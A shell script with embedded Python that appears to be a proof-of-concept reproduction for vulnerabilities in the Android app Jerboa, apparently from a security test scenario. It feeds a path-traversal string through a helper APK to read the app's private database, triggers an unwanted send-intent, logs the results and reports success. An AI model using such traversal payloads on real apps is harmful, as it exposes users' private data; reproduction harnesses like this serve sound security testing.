#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
LOG_FILE="$SCRIPT_DIR/fake_agent_log.log"

log() { printf '[vuln0] %s\n' "$*"; }

log "Starting vuln_scenario_0 for Jerboa"
log "Driving helper APK through traversal and send-intent side effects"

PYTHONPATH="$ROOT_DIR" python3 - "$LOG_FILE" <<'PY'
import json
import sys
import uuid
from pathlib import Path

from jerboa_probe_utils import run_helper_reproduction, run_traversal_reproduction

log_path = Path(sys.argv[1])
lines: list[str] = []

traversal_ok, traversal_content = run_traversal_reproduction(
    "shared_files/../../../../data/data/com.jerboa/databases/jerboa",
    run_id=uuid.uuid4().hex,
)
lines.append(
    "mode=traversal "
    f"transport_ok={str(traversal_ok).lower()} "
    f"read_preview={traversal_content[:200]}"
)

dispatch_body = f"mcb-post-{uuid.uuid4().hex}"
dispatch_ok, _ = run_helper_reproduction(
    mode="dispatch_send",
    body=dispatch_body,
    run_id=uuid.uuid4().hex,
)
lines.append(
    "mode=dispatch_send "
    f"transport_ok={str(dispatch_ok).lower()} "
    f"body={dispatch_body}"
)

log_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
if not traversal_ok or not dispatch_ok:
    raise SystemExit(1)
PY

log "Replay log written to: $LOG_FILE"
log "[+] Vulnerability successfully triggered."
